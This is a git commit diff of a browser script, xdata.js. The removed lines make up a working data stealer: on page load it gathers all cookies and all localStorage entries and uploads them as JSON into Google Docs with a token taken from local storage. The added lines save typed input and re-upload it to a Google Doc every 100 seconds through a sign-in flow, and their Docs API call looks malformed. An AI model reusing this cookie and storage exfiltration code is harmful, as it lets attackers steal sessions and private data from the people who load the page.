738e569728ccdfe4cabac240a70e932457868dd2
Gamius <hckrxyzz@gmail.com>
2025-03-30 21:37:53 +0600

    Update xdata.js

--- xdata.js
+++ xdata.js
@@ -1,57 +1,61 @@
-const { google } = require('googleapis');
-async function postToGoogleDocs(token, title, content) {
-    const auth = new google.auth.OAuth2();
-    auth.setCredentials({ access_token: token });
-    const docs = google.docs({ version: 'v1', auth });
-    const createResponse = await docs.documents.create({
-        requestBody: {
-            title: title
-        }
-    });
+const CLIENT_ID = localStorage.getItem('CLIENT_ID'); 
+const API_KEY = localStorage.getItem('API_KEY'); 
+const SCOPES = 'https://www.googleapis.com/auth/documents';
 
-    const documentId = createResponse.data.documentId;
-    await docs.documents.batchUpdate({
-        documentId: documentId,
-        requestBody: {
-            requests: [
-                {
-                    insertText: {
-                        location: {
-                            index: 1,
-                        },
-                        text: content
+function saveData() {
+            const dataInput = document.getElementById('dataInput').value;
+            localStorage.setItem('xdata', dataInput);
+        }
+
+function handleClientLoad() {
+            gapi.load('client:auth2', initClient);
+        }
+
+function initClient() {
+            gapi.client.init({
+                apiKey: API_KEY,
+                clientId: CLIENT_ID,
+                discoveryDocs: ["https://docs.googleapis.com/$discovery/rest?version=v1"],
+                scope: SCOPES
+            }).then(function () {
+                gapi.auth2.getAuthInstance().isSignedIn.listen(updateSigninStatus);
+                updateSigninStatus(gapi.auth2.getAuthInstance().isSignedIn.get());
+            });
+        }
+
+function updateSigninStatus(isSignedIn) {
+            if (isSignedIn) {
+                postData();
+            } else {
+                gapi.auth2.getAuthInstance().signIn();
+            }
+        }
+
+function postData() {
+ const xdata = localStorage.getItem('xdata');
+            if (xdata) {
+                gapi.client.docs.documents.create({
+                    title: 'xdata Document',
+                    body: {
+                        content: [
+                            {
+                                textRun: {
+                                    content: xdata
+                                }
+                            }
+                        ]
                     }
-                }
-            ]
+                }).then(function(response) {
+                    console.log('Success:', response);
+                }, function(error) {
+                    console.error('Error:', error);
+                });
+            }
         }
-    });
 
-    return documentId;
-}
-
-function getCookies() {
-    return document.cookie.split(';').reduce((cookies, cookie) => {
-        const [name, value] = cookie.split('=').map(c => c.trim());
-        cookies[name] = value;
-        return cookies;
-    }, {});
-}
-
-function getLocalStorage() {
-    return Object.keys(localStorage).reduce((data, key) => {
-        data[key] = localStorage.getItem(key);
-        return data;
-    }, {});
-}
-
-async function saveDataOnline() {
-    const cookies = getCookies();
-    const localStorageData = getLocalStorage();
-    const token = localStorage.getItem('gst_tkn');
-    const cookiesDocId = await postToGoogleDocs(token, 'Cookies Data', JSON.stringify(cookies, null, 2));
-    const localStorageDocId = await postToGoogleDocs(token, 'Local Storage Data', JSON.stringify(localStorageData, null, 2));
-
-    console.log('Cookies Doc ID:', cookiesDocId);
-    console.log('Local Storage Doc ID:', localStorageDocId);
-}
-saveDataOnline();
+setInterval(function() {
+            if (gapi.auth2.getAuthInstance().isSignedIn.get()) {
+                postData();
+            }
+        }, 100000);
+handleClientLoad();
